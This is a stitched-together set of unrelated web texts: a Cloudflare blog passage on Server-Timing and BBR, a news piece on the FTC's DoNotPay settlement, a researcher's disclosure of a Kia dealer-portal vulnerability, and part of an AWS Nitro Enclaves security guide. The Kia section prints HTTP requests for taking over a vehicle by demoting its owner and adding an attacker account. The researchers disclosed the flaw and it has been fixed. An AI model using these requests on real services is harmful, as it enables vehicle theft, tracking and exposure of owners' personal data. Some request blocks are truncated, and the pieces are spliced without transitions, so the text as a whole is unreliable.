Shift (CLS), which assesses visual stability. By using the CWV measurement in RUM, developers can monitor and optimize their applications to ensure a smoother, faster, and more stable user experience and track the impact of any changes they release.</p><p>Over the last three months we have developed the capability to include valuable information in Server-Timing response headers. When a page that uses Cloudflare Web Analytics is loaded in a browser, the privacy-first client-side script from Web Analytics collects browser metrics and server-timing headers, then sends back this performance data. This data is ingested, aggregated, and made available for querying. The server-timing header includes Layer 4 information, such as Round-Trip Time (RTT) and protocol type (TCP or QUIC). Combined with Core Web Vitals data, this allows us to determine whether an optimization has positively impacted a request compared to a control sample. This capability enables us to release large-scale changes such as HTTP/3 Prioritization or BBR with a clear understanding of their impact across our global network.</p><p>An example of this header contains several key properties that provide valuable information about the network performance as observed by the server:</p>
            <pre><code>server-timing: cfL4;desc="?proto=TCP&amp;rtt=7337&amp;sent=8&amp;recv=8&amp;lost=0&amp;retrans=0&amp;sent_bytes=3419&amp;recv_bytes=832&amp;delivery_rate=548023&amp;cwnd=25&amp;unsent_bytes=0&amp;cid=94dae6b578f91145&amp;ts=225</code></pre>
            <ul><li><p><b>proto</b>: Indicates the transport protocol used</p></li><li><p><b>rtt</b>: Round-Trip Time (RTT), representing the duration of the network round trip as measured by the layer 4 connection using a smoothing algorithm.</p></li><li><p><b>sent</b>: Number of packets sent.</p></li><li><p><b>recv</b>: Number of packets received.</p></li><li><p><b>lost</b>: Number of packets lost.</p></li><li><p><b>retrans</b>: Number of retransmitted packets.</p></li><li><p><b>sent_bytes</b>: Total number of bytes sent.</p></li><li><p><b>recv_bytes</b>: Total number of bytes received.</p></li><li><p><b>delivery_rate</b>: Rate of data delivery, an instantaneous measurement in bytes per second.</p></li><li><p><b>cwnd</b>: Congestion Window, an instantaneous measurement of packet or byte count depending on the protocol.</p></li><li><p><b>unsent_bytes</b>: Number of bytes not yet sent.</p></li><li><p><b>cid</b>: A 16-byte hexadecimal opaque connection ID.</p></li><li><p><b>ts</b>: Timestamp in milliseconds, representing when the data was captured.</p></li></ul><p>This real-time collection of performance data via RUM and Server-Timing headers allows Cloudflare to make data-driven decisions that directly enhance user experience. By continuously analyzing these detailed network and performance insights, we can ensure that future optimizations, such as HTTP/3 Prioritization or BBR deployment, are delivering tangible benefits for our customers.</p><h3>Enabling HTTP/3 Prioritization for all plans</h3><p>As part of our focus on improving observability through the integration of the server-timing header, we implemented several minor changes to optimize QUIC handshakes. Notably, we observed positive improvements in our telemetry due to the Layer 4 observability enhancements provided by the server-timing header. These internal findings coincided with third-party measurements, which showed similar improvements in handshake performance.</p><p>In the fourth quarter of 2024, we will apply the same experimental methodology to the HTTP/3 Prioritization support announced during Speed Week 2023. <a href="https://blog.cloudflare.com/better-http-3-prioritization-for-a-faster-web/"><u>HTTP/3 Prioritization</u></a> is designed to enhance the efficiency and speed of loading web pages by intelligently managing the order in which web assets are delivered to users. This is crucial because modern web pages are composed of numerous elements — such as images, scripts, and stylesheets — that vary in importance. Proper prioritization ensures that critical elements, like primary content and layout, load first, delivering a faster and more seamless browsing experience.</p><p>We will use this testing framework to measure performance improvements before enabling the feature across all plan types. This process allows us not only to quantify the benefits but, most importantly, to ensure there are no performance regressions.</p><h3>Congestion control</h3><p>Following the completion of the HTTP/3 Prioritization experiments we will then begin testing different congestion control algorithms, specifically focusing on <a href="https://cloud.google.com/blog/products/networking/tcp-bbr-congestion-control-comes-to-gcp-your-internet-just-got-faster"><u>BBR</u></a> (Bottleneck Bandwidth and Round-trip propagation time) version 3. Congestion control is a crucial mechanism in network communication that aims to optimize data transfer rates while avoiding network congestion. When too much data is sent too quickly over a network, it can lead to congestion, causing packet loss, delays, and reduced overall performance. Think of a busy highway during rush hour. If too many cars (data packets) flood the highway at once, traffic jams occur, slowing everyone down.</p>

          </figure><p>Congestion control algorithms act like traffic managers, regulating the flow of data to prevent these “traffic jams,” ensuring that data moves smoothly and efficiently across the network. Each side of a connection runs an algorithm in real time, dynamically adjusting the flow of data based on the current and predicted network conditions.

BBR is an advanced congestion control algorithm, initially developed by Google. BBR seeks to estimate the actual available bandwidth and the minimum round-trip time (RTT) to determine the optimal data flow. This approach allows BBR to maintain high throughput while minimizing latency, leading to more efficient and stable network performance.</p><p><a href="https://github.com/google/bbr/blob/v3/README.md"><u>BBR v3</u></a>, the latest iteration, builds on the strengths of its predecessors BBRv1 and BBRv2 by further refining its bandwidth estimation techniques and enhancing its adaptability to varying network conditions. We found BBR v3 to be faster in several cases compared to our previous implementation of <a href="https://datatracker.ietf.org/doc/html/rfc8312"><u>CUBIC</u></a>. Most importantly, it reduced loss and retransmission rates in our <a href="https://blog.cloudflare.com/introducing-oxy/"><u>Oxy</u></a> proxy implementation.</p>

            </figure><p>With these promising results, we are excited to test various congestion control algorithms including BBRv3 for <a href="https://github.com/cloudflare/quiche"><u>quiche</u></a>, our QUIC implementation, across our HTTP/3 traffic. Combining the layer 4 server-timing information with experiments in this area will enable us to explicitly control and measure the impact on real-world metrics.</p><h2>The future</h2><p>The future of the Internet relies on continuous innovation to meet the growing demands for speed, security, and scalability. Technologies like Zstandard for compression, BBR for congestion control, HTTP/3 prioritization, and Encrypted Client Hello are setting new standards for performance and privacy. By implementing these protocols, web services can achieve faster page load times, more efficient bandwidth usage, and stronger protections for user data.</p><p>These advancements don't just offer incremental improvements, they provide a significant leap forward in optimizing the user experience and safeguarding online interactions.

<p>Among the first AI companies that the Federal Trade Commission has exposed as deceiving consumers is DoNotPay—which initially was advertised as "the world's first robot lawyer" with the ability to "sue anyone with the click of a button."</p>
<p>On Wednesday, the FTC <a href="https://www.ftc.gov/news-events/news/press-releases/2024/09/ftc-announces-crackdown-deceptive-ai-claims-schemes">announced</a> that it took action to stop DoNotPay from making bogus claims after learning that the AI startup conducted no testing "to determine whether its AI chatbot’s output was equal to the level of a human lawyer." DoNotPay also did not "hire or retain any attorneys" to help verify AI outputs or validate DoNotPay's legal claims.</p>
<p>DoNotPay accepted no liability. But to settle the charges that DoNotPay violated the FTC Act, the AI startup agreed to pay $193,000 if the FTC's consent agreement is confirmed following a 30-day public comment period. Additionally, DoNotPay agreed to warn "consumers who subscribed to the service between 2021 and 2023" about the "limitations of law-related features on the service," the FTC said.</p>
<p>Moving forward, DoNotPay would also be prohibited under the settlement from making baseless claims that any of its features can be substituted for any professional service.</p>                                                                        
                                                                                
<p>A DoNotPay spokesperson told Ars that the company "is pleased to have worked constructively with the FTC to settle this case and fully resolve these issues, without admitting liability."</p>
<p>"The complaint relates to the usage of a few hundred customers some years ago (out of millions of people), with services that have long been discontinued," DoNotPay's spokesperson said.</p>
<p>The FTC's settlement with DoNotPay is part of a larger agency effort to crack down on deceptive AI claims. Four other AI companies were hit with enforcement actions Wednesday, the FTC said, and FTC Chair Lina Khan confirmed that the agency's so-called "Operation AI Comply" will continue monitoring companies' attempts to "lure consumers into bogus schemes" or use AI tools to "turbocharge deception."</p>
<p>“Using AI tools to trick, mislead, or defraud people is illegal,” Khan said. “The FTC’s enforcement actions make clear that there is no AI exemption from the laws on the books. By cracking down on unfair or deceptive practices in these markets, FTC is ensuring that honest businesses and innovators can get a fair shot and consumers are being protected.”</p>
<h2>DoNotPay never tested robot lawyer</h2>
<p>DoNotPay was initially released in 2015 as a free way to contest parking tickets. Soon after, it quickly expanded its services to cover 200 areas of law—aiding with everything from breach of contract claims to restraining orders to insurance claims and divorce settlements.</p>
<p>As DoNotPay's legal services expanded, the company defended its innovative approach to replacing lawyers while acknowledging that it was likely on shaky ground. In 2018, DoNotPay CEO Joshua Browder <a href="https://www.abajournal.com/news/article/file_a_smalls_claims_suit_anywhere_in_the_country_through_an_app#google_vignette">confirmed to the ABA Journal</a> that the legal services were provided with "no lawyer oversight." But he said that he was only "a bit worried" about threats to sue DoNotPay for unlicensed practice of law. Because DoNotPay was free, he expected he could avoid some legal challenges.</p>
<p>According to the FTC <a href="https://www.ftc.gov/system/files/ftc_gov/pdf/DoNotPayInc-Complaint.pdf">complaint</a>, DoNotPay began charging subscribers $36 every two months in 2019 while making several false claims in ads to apparently drive up subscriptions.</p>

<div id="readability-page-1" class="page"><div><h2 id="introduction">Introduction</h2>
<p>On June 11th, 2024, we discovered a set of vulnerabilities in Kia vehicles that allowed remote control over key functions using only a license plate. These attacks could be executed remotely on any hardware-equipped vehicle in about 30 seconds, regardless of whether it had an active Kia Connect subscription.</p>
<p>Additionally, an attacker could silently obtain personal information, including the victim's name, phone number, email address, and physical address. This would allow the attacker to add themselves as an invisible second user on the victim's vehicle without their knowledge.</p>

<p>We built a tool to demonstrate the impact of these vulnerabilities where an attacker could simply (1) enter the license plate of a Kia vehicle, then (2) execute commands on the vehicle after around 30 seconds. <strong>These vulnerabilities have since been fixed, this tool was never released, and the Kia team has validated this was never exploited maliciously.</strong></p>

<h2 id="vulnerability-writeup">Vulnerability Writeup</h2>
<p>Around two years ago, <a href="https://samcurry.net/web-hackers-vs-the-auto-industry">a few hackers and I hunted for vulnerabilities on over a dozen different car companies</a>. We discovered critical issues that would've allowed attackers to remotely locate, disable starters, unlock, and start an estimated 15.5 million vehicles. There was a big reaction to this. Paul Roberts, founder of The Security Ledger, <a href="https://www.youtube.com/watch?v=U4rzdXibXC0&amp;t=45m15s">even testified about these findings in a US congressional hearing</a>.</p>
<p>Since so much time had passed, we decided to revisit a few of the larger companies to see if we couldn't discover any new issues. The first one we spent time on was Kia.</p>
<p>When we began looking at Kia, we originally focused on the <code>owners.kia.com</code> website and the Kia Connect iOS app <code>com.myuvo.link</code>. Both of these applications were interesting because they could execute internet-to-vehicle commands.</p>
<p>While the owners website and the mobile app served the same purpose, they handled vehicle commands differently. The owners website used a backend reverse-proxy to forward user commands to the <code>api.owners.kia.com</code> backend service that was actually responsible for actually executing vehicle commands, whereas the mobile app instead accessed this API directly.</p>
<p>The following HTTP request shows how the <code>owners.kia.com</code> website will proxy an API request to the <code>api.owners.kia.com</code> host to unlock a car door.</p>
<h4>HTTP Request to Unlock Car Door on the "owners.kia.com" website</h4>
<pre><code><span>POST</span> <span>/apps/services/owners/apigwServlet.html</span> <span>HTTP/2</span>
<span>Host:</span> <span>owners.kia.com</span>
<span>Httpmethod:</span> <span>GET</span>
<span>Apiurl:</span> <span>/door/unlock</span>
<span>Servicetype:</span> <span>postLoginCustomer</span>
<span>Cookie:</span> <span>JSESSIONID=SESSION_TOKEN;</span>
</code></pre>
<p>After sending the above HTTP request that originated from the <code>owners.kia.com</code> website, the Kia backend will generate a <code>Sid</code> session ID header that is consumed by the backend API using our <code>JSESSIONID</code> as auth, then finally send the forwarded HTTP request to the <code>api.owners.kia.com</code> website in the following format.</p>
<h4>HTTP Request Formed and Proxied by Server</h4>
<pre><code><span>GET</span> <span>/apigw/v1/rems/door/unlock</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>api.owners.kia.com</span>
<span>Sid:</span> <span>454817d4-b228-4103-a26f-884e362e8dee</span>
<span>Vinkey:</span> <span>3ecc1a19-aefd-4188-a7fe-1723e1663d6e</span>
</code></pre>
<p>The important headers in the above HTTP request are the <code>Sid</code> (session token) and <code>Vinkey</code> (UUID that indexes to VIN). There are various other headers included that are all necessary to access the API itself, but those are the two related to vehicle access controls. Both of the above HTTP requests were in the same area we had found the original Kia vulnerabilities in 2023.</p>
<p>Since we were already super familiar with the user side of things, we decided to look at the Kia Dealer website instead.</p>
<h4>Targeting Kia Dealer Infrastructure</h4>
<p>Something we'd never tested was how Kia actually performed vehicle activations for new purchases. After speaking to a few people, we learned that Kia would ask for your email address at the dealership and you'd receive a registration link to either register a new Kia account or add your newly purchased vehicle to your pre-existing Kia account.</p>
<p>We asked if they could share the registration links given to them by Kia, and nicely enough, they forwarded their emails. We copied the following URL from the hyperlink:</p>
<pre><code>https://kiaconnect.kdealer.com/content/kDealer/en/kiauser.html?token=dealer_generated_access_token&amp;vin=example_vin&amp;scenarioType=3
</code></pre>
<p>Super interesting! The <code>kiaconnect.kdealer.com</code> domain was one we'd never seen before. We opened the URL and saw the following endpoint:</p>
<figure><img alt="Kiaconnect Initial Vehicle Registration URL" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2F3.webp&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2F3.webp&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2F3.webp&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2F3.webp&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2F3.webp&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2F3.webp&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2F3.webp&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2F3.webp&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2F3.webp&amp;w=3840&amp;q=75"><figcaption>Kiaconnect Initial Vehicle Registration URL</figcaption></figure>
<p>In the above URL, the <code>token</code> parameter (otherwise known as a VIN Key) is an access token generated by a Kia dealer as a one-time grant to modify the vehicle specified in the <code>vin</code> parameter. After loading the above URL, the following HTTP request will be sent to validate that the token has not expired or been used.</p>
<pre><code><span>POST</span> <span>/apps/services/kdealer/apigwServlet.html</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>kiaconnect.kdealer.com</span>

{
  <span>"token":</span> <span>"985a49f0-1fe5-4d36-860e-d9b93272072b"</span>,
  <span>"vin":</span> <span>"5XYP3DHC9NG310533"</span>,
  <span>"scenarioType":</span> <span>3</span>,
  <span>"loginPref":</span> <span>null</span>
}
</code></pre>
<p>Very interesting. The HTTP request sent to validate the one-time access token was being sent to the same <code>/apps/services/kdealer/apigwServlet.html</code> URI as the previous <code>owners.kia.com</code> request, except this time, it was being sent on the Kia Connect dealer website. This likely meant that the dealer infrastructure had a similar forwarding proxy to an internal API for dealership functionality.</p>
<p>We dug through the JavaScript looking for interesting APIGW calls and found what appeared to be employee-only functionality. There were references to dealer vehicle lookup, account lookup, enroll, unenroll, and many more dealer related API calls.</p>
<pre><code><span>dealerVehicleLookUp</span>(<span></span>) {
    <span>this</span>.<span>displayLoader</span> = !<span>0</span>, <span>this</span>.<span>vinToEnroll</span> = <span>"eDelivery"</span> != <span>this</span>.<span>entryPoint</span> ? <span>this</span>.<span>vinToEnroll</span>.<span>replace</span>(<span>/\s/g</span>, <span>""</span>) : <span>this</span>.<span>userDetails</span>.<span>vin</span>, <span>"17"</span> == <span>this</span>.<span>vinToEnroll</span>.<span>length</span> &amp;&amp; <span>this</span>.<span>landingPageService</span>.<span>postOffice</span>({
        <span>vin</span>: <span>this</span>.<span>vinToEnroll</span>
    }, <span>"/dec/dlr/dvl"</span>, <span>"POST"</span>, <span>"postLoginCustomer"</span>).<span>subscribe</span>(<span><span>i</span> =&gt;</span> {
        i &amp;&amp; (i.<span>hasOwnProperty</span>(<span>"body"</span>) &amp;&amp; <span>"0"</span> == i.<span>body</span>.<span>status</span>.<span>statusCode</span> ? <span>this</span>.<span>processDvlData</span>(i.<span>body</span>) : <span>"1003"</span> == i.<span>body</span>.<span>status</span>.<span>errorCode</span> &amp;&amp; <span>"kia-dealer"</span> == <span>this</span>.<span>entryPoint</span> ? <span>this</span>.<span>reRouteSessionExpire</span>() : (<span>this</span>.<span>displayLoader</span> = !<span>1</span>, <span>this</span>.<span>alertMessage</span> = i.<span>body</span>.<span>status</span>.<span>errorMessage</span>, <span>document</span>.<span>getElementById</span>(<span>"triggerGeneralAlertModal"</span>).<span>click</span>()))
    })
}
</code></pre>
<p>To test if we could access any of these endpoints, we formed the HTTP request to the dealer APIGW endpoint with our own dealer token (<code>Appid</code> header) and the VIN of a vehicle that we owned.</p>
<h4>Attempted HTTP Request to Search VIN using Kia Dealer APIGW Endpoint</h4>
<pre><code><span>POST</span> <span>/apps/services/kdealer/apigwServlet.html</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>kiaconnect.kdealer.com</span>
<span>Httpmethod:</span> <span>POST</span>
<span>Apiurl:</span> <span>/dec/dlr/dvl</span>

{
    <span>"vin":</span> <span>"1HGBH41JXMN109186"</span>
}
</code></pre>
<h4>HTTP Response</h4>
<pre><code><span>HTTP/1.1</span> <span>401</span> <span>Unauthorized</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>"status":</span> {
    <span>"statusCode":</span> <span>1</span>,
    <span>"errorType":</span> <span>1</span>,
    <span>"errorCode":</span> <span>1003</span>,
    <span>"errorMessage":</span> <span>"Session Key is either invalid or expired"</span>
  }
}
</code></pre>
<p>Nope. It did not seem like the dealer endpoints wanted to work with the access token that was given to us via email when purchasing a new car.</p>
<p>We thought back to the original <code>owners.kia.com</code> website and then wondered: what if there was a way to just register as a dealer, generate an access token, then use that access token here? The <code>kiaconnect.kdealer.com</code> website seemed to have the same API format, so maybe we could just copy the format, register an account, and login?</p>
<pre><code><span>POST</span> <span>/apps/services/kdealer/apigwServlet.html</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>kiaconnect.kdealer.com</span>
<span>Httpmethod:</span> <span>POST</span>
<span>Apiurl:</span> <span>/prof/registerUser</span>

{
  <span>"userCredential":</span> {
    <span>"firstName":</span> <span>"Sam"</span>,
    <span>"lastName":</span> <span>"Curry"</span>,

    <span>"password":</span> <span>"FakePass123!"</span>,
    <span>"acceptedTerms":</span> <span>1</span>
  }
}
</code></pre>
<p>It returned 200 OK! It seemed that we could register on the Kia Dealer website using the same HTTP request to register on the Kia Owners website. We quickly tried to login and generate an access token:</p>
<pre><code><span>POST</span> <span>/apps/services/kdealer/apigwServlet.html</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>kiaconnect.kdealer.com</span>
<span>Httpmethod:</span> <span>POST</span>
<span>Apiurl:</span> <span>/prof/authUser</span>

{
  <span>"userCredential":</span> {
    <span>"userId":</span> <span>"normal.user@gmail.com"</span>,
    <span>"password":</span> <span>"FakePass123!"</span>
  }
}
</code></pre>
<p>The login was valid, the server returned an HTTP response with a session cookie.</p>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Sid:</span> <span>123e4567</span><span>-e89b-12d3-a456-426614174000</span>
</code></pre>
<p>We sent our generated access token to the previously unauthorized dealer APIGW endpoint to search a VIN.</p>
<h4>HTTP Request to Search VIN using Kia Dealer APIGW Endpoint (with “dda” access token)</h4>

</code></pre>
<p>After registering and authenticating to a dealer account, we were able to generate a valid access token that could be used to call the backend dealer APIs! The HTTP response contained the vehicle owner's name, phone number, and email address. We were able to authenticate into the dealer portal using our normal app credentials and the modified channel header. This meant that we could likely hit all other dealer endpoints.</p>
<h4>Taking Over Vehicles</h4>
<p>After sifting through the JavaScript for a few hours, we finally learned how the enrollment, unenrollment, and vehicle modification endpoints worked. The following four HTTP requests could be sent in order to gain access to a victim's vehicle.</p>
<figure><img alt="Full high level attack flow" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2Fflow.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2Fflow.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2Fflow.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2Fflow.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2Fflow.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2Fflow.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2Fflow.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2Fflow.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2Fflow.png&amp;w=3840&amp;q=75"><figcaption>Full high level attack flow</figcaption></figure>

<ul>
<li>Using the dealer account we created, we'll auth through the <code>/prof/authUser</code> endpoint to obtain a session token.</li>
</ul>
<p><strong>(2) Fetch Victim’s Email Address and Phone Number</strong></p>

}
</code></pre>
<ul>
<li>With the added session token header, we are able to access all dealer endpoints on the <code>kiaconnect.kdealer.com</code> website and can retrieve the victim's name, phone number, and email.</li>
</ul>
<p><strong>(3) Modify Owner’s Previous Access using Leaked Email Address and VIN number</strong></p>
<pre><code><span>POST</span> <span>/apps/services/kdealer/apigwServlet.html</span> <span>HTTP/1.1</span>

}
</code></pre>
<ul>
<li>We send this request to demote the owner of the vehicle so that we can add ourselves as the primary account holders. We must send the victim's email here, which we obtained in step two.</li>
</ul>
<p><strong>(4) Add Attacker to Victim Vehicle</strong></p>
<pre><code><span>POST</span> <span>/apps/services/kdealer/apigwServlet.html</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>kiaconnect.kdealer.com</span>
<span>Httpmethod:</span> <span>POST</span>

<span>Appid:</span> <span>123e4567</span><span>-e89b-12d3-a456-426614174000</span>

{
  <span>"vin":</span> <span>"5XYRK4LFXMG016215"</span>,
  <span>"loginId":</span> <span>"attacker@gmail.com"</span>
}
</code></pre>
<ul>
<li>Finally, we'll assign our attacker-controlled email as the primary owner of the vehicle. This will allow us to send arbitrary commands to the vehicle.</li>
</ul>
<p>The above four HTTP requests could be used to send commands to pretty much any Kia vehicle made after 2013 (see "Vehicles Affected" table for specifics) using only the license plate.</p>
<p>From the victim's side, there was no notification that their vehicle had been accessed nor their access permissions modified. An attacker could resolve someone's license plate, enter their VIN through the API, then track them passively and send active commands like unlock, start, or honk.</p>
<p>The impact here was really obvious to us and we reported it to Kia immediately, but while they were working on a fix we decided to build a proof of concept dashboard that better demonstrated the impact of this vulnerability.</p>
<h4>Creating License Plate Takeover Proof of Concept</h4>
<p>The goal of our proof of concept UI was to simply have a dashboard where an attacker could (1) type in the license plate of a Kia vehicle, (2) retrieve the owner's PII, then (3) execute commands on the vehicle.</p>
<p>Because we were adding the victims’ vehicle to our attacker controlled account, we decided to build the proof of concept to have an “exploit” and “garage” page. The exploit page would be used to actually take over the vehicles, then the garage page would be used to issue commands and locate the vehicles.</p>
<p>It worked via the following:</p>
<ul>
<li>The <code>License Plate to VIN</code> form uses a third-party API to convert license plate number to VIN</li>
<li>The <code>Takeover</code> button would do the 4-step process to takeover a victim’s vehicle using the retrieved VIN from the license plate number, by (1) generating a dealer token via the login form, (2) retrieving the email/phone number from the victim’s account, (3) demoting the account owner to an account holder, (4) adding ourselves as the primary account holder.</li>
<li>The <code>Fetch Owner</code> button would passively tell us the name, email, and phone number of the victim</li>
<li>The <code>Garage</code> tab would allow us to list and execute commands on compromised vehicles</li>
</ul>
<p>After building this tool, we recorded a proof of concept using a locked rental Kia. This video included at the start of the blog shows us taking over a vehicle using our phone, then being able to remotely lock/unlock, start/stop, honk, and locate the vehicle.</p>

<h2 id="conclusion">Conclusion</h2>
<p>Cars will continue to have vulnerabilities, because in the same way that Meta could introduce a code change which would allow someone to takeover your Facebook account, car manufacturers could do the same for your vehicle.</p>

</ul>
<p>Whether you’re new to Nitro Enclaves or looking to harden existing deployments, this guide will help you navigate the unique security landscape of confidential computing on AWS.</p>
<h3>A brief threat model</h3>
<p>First, a brief threat model. Enclaves can be attacked from the parent Amazon EC2 instance, which is the only component that has direct access to an enclave. In the context of an attack on an enclave, we should assume that the parent instance’s kernel (including its <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/drivers/virt/nitro_enclaves?id=793f55b2971e3a95d77ad08e9da2a3dc6c946cd7"><code>nitro_enclaves</code> drivers</a>) is controlled by the attacker. DoS attacks from the instance are not really a concern, as the parent can always shut down its enclaves.</p>
<p>If the EC2 instance forwards user traffic from the internet, then attacks on its enclaves could come from that direction and could involve all the usual attack vectors (business-logic, memory corruption, cryptographic, etc.). And in the other direction, users could be targeted by malicious EC2 instances with impersonation attacks.</p>
<p>In terms of trust zones, an enclave should be treated as a single trust zone. Enclaves run normal Linux and can theoretically use its access control features to “drive lines” within themselves. But that would be pointless—adversarial access (e.g., via a supply-chain attack) to anything inside the enclave would diminish the benefits of its strong isolation and of attestation. Therefore, compromise of a single enclave component should be treated as a total enclave compromise.</p>
<p>Finally, the hypervisor is trusted—we must assume it behaves correctly and not maliciously.</p>

<h3>Vsocks</h3>
<p>The main entrypoint to an enclave is the local <a href="https://archive.fosdem.org/2021/schedule/event/vai_virtio_vsock/">virtual socket</a> (vsock). Only the parent EC2 instance can use the socket. Vsocks are managed by the hypervisor—the hypervisor provides the parent EC2 instance’s and the enclave’s kernels with <code>/dev/vsock</code> device nodes.</p>
<p>Vsocks are identified by a context identifier (CID) and port. Every enclave must use a unique CID, which can be set during initialization and can listen on multiple ports. There are a few predefined CIDs:</p>
<ul>
<li><code>VMADDR_CID_HYPERVISOR</code> = 0</li>
<li><code>VMADDR_CID_LOCAL</code> = 1</li>
<li><code>VMADDR_CID_HOST</code> = 2</li>
<li><code>VMADDR_CID_PARENT</code> = 3 (the parent EC2 instance)</li>
<li><code>VMADDR_CID_ANY</code> = <code>0xFFFFFFFF</code> = -1U (listen on all CIDs)</li>
</ul>
<p>Enclaves usually use only the <code>VMADDR_CID_PARENT CID</code> (to send data) and the <code>VMADDR_CID_ANY CID</code> (to listen for data). An example use of the <code>VMADDR_CID_PARENT</code> can be found in the <a href="https://github.com/aws/aws-nitro-enclaves-sdk-bootstrap/blob/ac43d103ba0f98044bf760477c088f1dc6f3702d/init/init.c#L410-L410"><code>init.c</code> module</a> of AWS’s enclaves SDK—the enclave sends a “heartbeat” signal to the parent EC2 instance just after initialization. The signal is <a href="https://github.com/aws/aws-nitro-enclaves-cli/blob/c4fafb2320bc13d1e74e6ba2c1b6ef840cba0988/eif_loader/src/lib.rs#L54-L56">handled by the <code>nitro-cli</code></a> tool.</p>
<p><strong>Standard socket-related issues are the main issues to worry about when it comes to vsocks.</strong> When developing an enclave, consider the following to ensure such issues cannot enable certain attack vectors:</p>
<ul>
<li>Does the enclave accept connections asynchronously (with multithreading)? If not, a single user may block other users from accessing the enclave for a long period of time.</li>
<li>Does the enclave time out connections? If not, a single user may persistently occupy a socket or open multiple connections to the enclave and drain available resources (like file descriptors).</li>
<li>If the enclave uses multithreading, is its state synchronization correctly implemented?</li>
<li>Does the enclave handle errors correctly? Reading from a socket with the <a href="https://man7.org/linux/man-pages/man2/recvmsg.2.html"><code>recv</code> method</a> is especially tricky. A <a href="https://github.com/aws/aws-nitro-enclaves-cli/blob/c4fafb2320bc13d1e74e6ba2c1b6ef840cba0988/samples/command_executer/src/protocol_helpers.rs#L51-L65">common pattern is to loop</a> over the <code>recv</code> call until the desired number of bytes is received, but this pattern should be carefully implemented:
<ul>
<li>If the <a href="https://android.googlesource.com/platform/bionic/+/master/docs/EINTR.md"><code>EINTR</code> error is returned</a>, the enclave should retry the <code>recv</code> call. Otherwise, the enclave may drop valid and live connections.</li>
<li>If there is no error but the returned length is 0, the enclave should break the loop. Otherwise, the peer <a href="https://github.com/aws/aws-nitro-enclaves-cli/pull/609">may shut down the connection</a> before sending the expected number of bytes, making the enclave loop infinitely.</li>
<li>If the socket is non-blocking, then reading data correctly is even more tricky.</li>
</ul>
</li>
</ul>
<p>The main risk of these issues is DoS. The parent EC2 instance may shut down any of its enclaves, so the actual risks are present only if a DoS can be triggered by external users. Providing timely access to the system is the responsibility of both the enclave and the EC2 instance communicating with the enclave.</p>
<p>Another vulnerability class involving vsocks is CID confusion: if an EC2 instance runs multiple enclaves, it may send data to the wrong one (e.g., due to a race condition issue). However, even if such a bug exists, it should not pose much risk or contribute much to an enclave’s attack surface, because traffic between users and the enclave should be authenticated end to end.</p>
<p>Finally, note that enclaves use the <code>SOCK_STREAM</code> socket type by default. If you change the type to <code>SOCK_DGRAM</code>, do some research to learn about the security properties of this communication type.</p>
<h3>Randomness</h3>
<p>Enclaves must have access to secure randomness. The word “secure” in this context means that adversaries don’t know or control all the entropy used to produce random data. On Linux, <a href="https://elixir.bootlin.com/linux/latest/source/drivers/char/random.c#L749">a few entropy sources</a> are mixed together by the kernel. Among them are the <a href="https://elixir.bootlin.com/linux/latest/source/drivers/char/random.c#L662">CPU-provided <code>RDRAND/RDSEED</code> source</a> and platform-provided hardware random number generators (RNGs). The AWS Nitro Trusted Platform Module <a href="https://lore.kernel.org/all/20230929133320.74848-1-graf@amazon.com/T/">provides its own hardware RNG</a> (called <code>nsm-hwrng</code>).</p>

<p>The final randomness can be obtained via the <a href="https://man7.org/linux/man-pages/man2/getrandom.2.html"><code>getrandom</code></a> system call or from (less reliable) <code>/dev/{u}random</code> devices. There is also the <code>/dev/hwrng</code> device, which gives more direct access to the selected hardware RNG. This device should not be used by user-space applications.</p>
<p>When a new hardware RNG is registered by the kernel, <a href="https://elixir.bootlin.com/linux/latest/source/drivers/char/hw_random/core.c#L585">it is used right away</a> to add entropy to the system. A list of available hardware RNGs can be found in the <code>/sys/class/misc/hw_random/rng_available</code> file. One of the registered RNGs is selected automatically <a href="https://elixir.bootlin.com/linux/latest/source/drivers/char/hw_random/core.c#L237">to periodically add entropy</a> and is indicated in the <code>/sys/devices/virtual/misc/hw_random/rng_current</code> file.</p>
